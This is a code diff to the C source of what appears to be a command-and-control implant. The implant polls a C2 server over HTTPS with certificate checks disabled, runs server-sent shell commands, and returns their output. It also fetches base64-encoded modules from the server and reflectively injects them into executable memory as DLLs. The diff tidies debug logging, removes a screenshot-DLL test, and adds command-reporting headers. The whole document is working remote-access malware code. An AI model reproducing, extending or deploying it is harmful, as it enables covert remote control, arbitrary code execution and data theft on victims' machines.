@@ -21,12 +21,14 @@
 #pragma comment(lib, "wldap32.lib")
 #pragma comment(lib, "tinycurl\\lib\\libcurl_a.lib")
 
+#define dprint(x)
 CommandNode* commandList = NULL;
 
 int main(void);
 void jitter_connect(void);
 void command_loop(void);
 char *execute_command(const char *cmd);
+void update_curl_headers(void);
 
 __declspec(dllexport) void MainExport(void);
 
@@ -35,12 +37,16 @@ char* STORED_RESPONSE = NULL;
 // Commands header info
 char* COMMANDS_HEADER = "Commands: ";
 char* AVAILABLE_COMMANDS = NULL;
+char* CLIENTID = "clientid: 10"; // TODO
+char* CURRENT_COMMAND = NULL; // TODO: Make this not a global?
+struct curl_slist *CLIENT_HEADERS = NULL;
+
 
 // Built-in Commands
 char* CMD_exec(char* args)
 {
     char* tmp = execute_command(args);
-    printf("Command: %s\nResult: %s\n", args, tmp);
+    debugf("Command: %s\nResult: %s\n", args, tmp);
     return tmp;
 }
 
@@ -52,7 +58,7 @@ char* CMD_shell(char* args)
 
 char* CMD_load(char* args)
 {
-    printf("Received load command with arguments: %s\n", args);
+    debugf("Received load command with arguments: %s\n", args);
     size_t module_len = 0;
     unsigned char* module = base64_decode(args, strlen(args), &module_len);
     LPVOID lpBuffer = NULL;
@@ -61,14 +67,14 @@ char* CMD_load(char* args)
     if (module == NULL)
         return NULL;
     
-    printf("Module: %p", module);
-    printf("Module length: %zu\n", module_len);
+    debugf("Module: %p", module);
+    debugf("Module length: %zu\n", module_len);
     lpBuffer = VirtualAlloc(NULL, module_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if( !lpBuffer )
 		BREAK_WITH_ERROR( "Failed to allocate space" );
 
     memcpy(lpBuffer, module, module_len);
-    printf("memcpy\n");
+    debugf("memcpy\n");
     fflush(stdout);
 
     CommandNodePointer func;
@@ -77,14 +83,14 @@ char* CMD_load(char* args)
 		BREAK_WITH_ERROR( "Failed to inject the DLL" );
     
     CommandNode* tester = func();
-    printf("Tester: %s\n", tester->command);
-    printf("Done with reflective test.\n");
+    debugf("Tester: %s\n", tester->command);
 
     insertCommandNode(&commandList, createCommandNode(tester->command, tester->function));
     if (AVAILABLE_COMMANDS) {free(AVAILABLE_COMMANDS); AVAILABLE_COMMANDS=NULL;}
     AVAILABLE_COMMANDS = getCommands(commandList, COMMANDS_HEADER);
+    update_curl_headers();
 
-    printf("Inserted command!\n");
+    debugf("Inserted command!\n");
 
     return NULL;
 }
@@ -124,45 +130,13 @@ void check_response(char* data)
 
     if (commandnode != NULL)
     {
+        CURRENT_COMMAND = commandnode->command;
         STORED_RESPONSE = commandnode->function(arguments);
     }
 }
 
-#ifdef DEBUG
-#include "messagebox.h"
-#include "screenshot.h"
-void ReflectiveTest(void)
-{
-    LPVOID lpBuffer = NULL;
-    HANDLE hModule  = NULL;
-
-    // lpBuffer = VirtualAlloc(NULL, messageboxdll_dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    lpBuffer = VirtualAlloc(NULL, screenshot_dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if( !lpBuffer )
-		BREAK_WITH_ERROR( "Failed to allocate space" );
-
-    // memcpy(lpBuffer, messageboxdll_dll, messageboxdll_dll_len);
-    memcpy(lpBuffer, screenshot_dll, screenshot_dll_len);
-    printf("memcpy\n");
-    fflush(stdout);
-
-    CommandNodePointer func;
-    hModule = (HANDLE)ReflectiveLoader( lpBuffer, &func );
-	if( !hModule )
-		BREAK_WITH_ERROR( "Failed to inject the DLL" );
-    
-    CommandNode* tester = func();
-    printf("Tester: %s\n", tester->command);
-    STORED_RESPONSE = tester->function("some args");
-    printf("Done with reflective test.\n");
-}
-#endif
-
 int main(void)
 {
-    #ifdef DEBUG
-    ReflectiveTest();
-    #endif
     // Initialize curl
     curl_global_init(CURL_GLOBAL_DEFAULT);
 
@@ -174,11 +148,12 @@ int main(void)
     insertCommandNode(&commandList, createCommandNode("install", CMD_install));
 
     // Initialize available commands that the server returns; updated in `load` command
-    printf("Getting commands\n");
+    debugf("Getting commands\n");
     AVAILABLE_COMMANDS = getCommands(commandList, COMMANDS_HEADER);
+    update_curl_headers();
 
     // Start C2
-    printf("Starting C2\n");
+    debugf("Starting C2\n");
 
     jitter_connect();
 
@@ -209,7 +184,7 @@ size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
     char *ptr_realloc = realloc(mem->memory, mem->size + realsize + 1);
     if (ptr_realloc == NULL)
     {
-        fprintf(stderr, "Memory allocation failed\n");
+        debugf("Memory allocation failed\n");
         return 0;
     }
     
@@ -221,30 +196,46 @@ size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
     return realsize;
 }
 
+// Utilizes numerous globals. Potential TODO: Single struct?
+void update_curl_headers(void)
+{
+    if (CLIENT_HEADERS)
+    {
+        curl_slist_free_all(CLIENT_HEADERS);
+    }
+    CLIENT_HEADERS = curl_slist_append(NULL, CLIENTID);
+    curl_slist_append(CLIENT_HEADERS, AVAILABLE_COMMANDS); // return ignored
+    if (CURRENT_COMMAND)
+    {
+        char command_hdr[] = "command: ";
+        size_t buffer_size = strlen(CURRENT_COMMAND)+sizeof(command_hdr) + 1;
+        char* command_buffer = calloc(buffer_size, 1);
+        snprintf(command_buffer, buffer_size, "%s%s", command_hdr, CURRENT_COMMAND);
+        curl_slist_append(CLIENT_HEADERS, command_buffer);
+    }
+}
+
 void command_loop(void)
 {
-    CURL *curl;
-    CURLcode res;
     struct MemoryStruct chunk;
-    // Initialize memory structure
-    chunk.memory = malloc(1);
+
+    // Stuff that will need to be free'd
+    CURL *curl = NULL;
+    unsigned char free_response = 0;
+    chunk.memory = calloc(1,1);
+
+    // Initialize the "chunk" used to receive data
     if (chunk.memory == NULL)
     {
-        fprintf(stderr, "Memory allocation failed\n");
+        debugf("Memory allocation failed\n");
         return;
     }
     chunk.size = 0;  // No data yet
     
-    char* tmp = NULL;
     curl = curl_easy_init();
     if (curl)
     {
-        struct curl_slist *headers_list = NULL;
-        headers_list = curl_slist_append(headers_list, "clientid: 10");
-        headers_list = curl_slist_append(headers_list, AVAILABLE_COMMANDS);
-
-        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers_list);
-        curl_easy_setopt(curl, CURLOPT_URL, "https://127.0.0.1/");
+        curl_easy_setopt(curl, CURLOPT_URL, "https://127.0.0.1/");      // TODO: Round-robin servers
 
         // For errors
         char errbuf[CURL_ERROR_SIZE];
@@ -254,11 +245,12 @@ void command_loop(void)
         // If STORED_RESPONSE is not NULL, we have data to send to the server
         if (STORED_RESPONSE != NULL)
         {
-            printf("sending response: %s\n", STORED_RESPONSE);
-            char *tmp = strdup(STORED_RESPONSE);
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
-            free(STORED_RESPONSE);
-            STORED_RESPONSE = NULL;
+            debugf("sending response: %s\n", STORED_RESPONSE);
+            // Does not create a copy of data, so mark that it needs to be free'd
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, STORED_RESPONSE);
+            free_response = 1;
+            // Update headers with current command
+            update_curl_headers();
         }
         else
         {
@@ -266,6 +258,9 @@ void command_loop(void)
             // curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "none");
         }
+
+        // Set headers
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, CLIENT_HEADERS);
 
         // Disable SSL certificate verification
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
@@ -277,33 +272,48 @@ void command_loop(void)
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
 
         // Perform the request
-        res = curl_easy_perform(curl);
+        CURLcode res = curl_easy_perform(curl);
         if (res != CURLE_OK)
         {
             size_t len = strlen(errbuf);
-            fprintf(stderr, "\nlibcurl: (%d) ", res);
+            debugf("\nlibcurl: (%d) ", res);
             if(len)
             {
-                fprintf(stderr, "IF:%s%s", errbuf,((errbuf[len - 1] != '\n') ? "\n" : ""));
+                debugf("IF:%s\n", errbuf);
             }
             else
             {
                 long response_code;
                 curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
-                fprintf(stderr, "ELSE:%s\n", curl_easy_strerror(res));
-                printf("Response code: %ld\n", response_code);
+                debugf("ELSE:%s\n", curl_easy_strerror(res));
+                debugf("Response code: %ld\n", response_code);
             }
         }
         else
         {
-            check_response(chunk.memory);
+            // Don't assume empty memory was assigned to chunk.memory, so check chunk.size
+            if (chunk.size)
+            {
+                check_response(chunk.memory);
+            }
         }
 
         // Cleanup
+        debugf("performing curl cleanup.\n");
         curl_easy_cleanup(curl);
     }
-    if (tmp)          {free(tmp);}
-    if (chunk.memory) {free(chunk.memory);}
+    debugf("Freeing stuff.\n");
+    // We sent a response, so free the response and remove the command header
+    if (free_response)
+    {
+        free(STORED_RESPONSE);
+        free_response = 0;
+        STORED_RESPONSE = NULL;
+        CURRENT_COMMAND = NULL;
+        update_curl_headers();
+    }
+    if (chunk.memory)  {free(chunk.memory);}
+    debugf("Done with loop\n");
 }
 
 // Execute a command and capture its output. Cross-compilable for both Unix and Windows
@@ -315,6 +325,7 @@ char *execute_command(const char *cmd)
     #endif
     FILE *fp;
     char *result = NULL;
+    char *tmp = NULL;
     char line[1024];
     size_t len = 0;
     size_t total_size = 0;
@@ -323,7 +334,7 @@ char *execute_command(const char *cmd)
     fp = popen(cmd, "r");
     if (fp == NULL)
     {
-        fprintf(stderr, "Failed to run command\n");
+        debugf("Failed to run command\n");
         return NULL;
     }
 
@@ -331,20 +342,20 @@ char *execute_command(const char *cmd)
     while (fgets(line, sizeof(line), fp) != NULL)
     {
         size_t line_length = strlen(line);
-        result = realloc(result, total_size + line_length + 1);
-        if (result == NULL)
+        tmp = realloc(result, total_size + line_length + 1);
+        if (tmp == NULL)
         {
-            fprintf(stderr, "Memory allocation failed\n");
+            debugf("Memory allocation failed\n");
             pclose(fp);
-            return NULL;
+            return result;
         }
+        result = tmp;
         strcpy(result + total_size, line);
         total_size += line_length;
     }
 
     // Clean up
     pclose(fp);
-
     return result;
 }
 
